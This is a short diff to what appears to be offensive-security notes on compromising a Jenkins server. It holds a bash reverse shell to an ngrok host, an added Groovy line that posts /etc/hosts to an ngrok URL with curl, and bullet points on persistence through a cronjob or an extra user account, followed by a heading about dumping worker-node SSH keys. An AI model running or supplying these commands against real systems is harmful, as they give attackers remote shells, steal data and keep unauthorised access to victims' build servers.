@@ -58,6 +58,15 @@ revshell.sh
 ```
 bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/13520 0>&1
 ```
+  - Exfiltrate data
+exfil.groovy
+```
+"curl -X POST https://6aee-91-166-172-59.ngrok-free.app -d @/etc/hosts".execute()
+```
+  - Use other persistent techniques
+    - Add a cronjob
+    - Add another user
+
 ## Worker-Node SSH Keys
 
 - We can dump the SSH keys from the Jenkins Controller
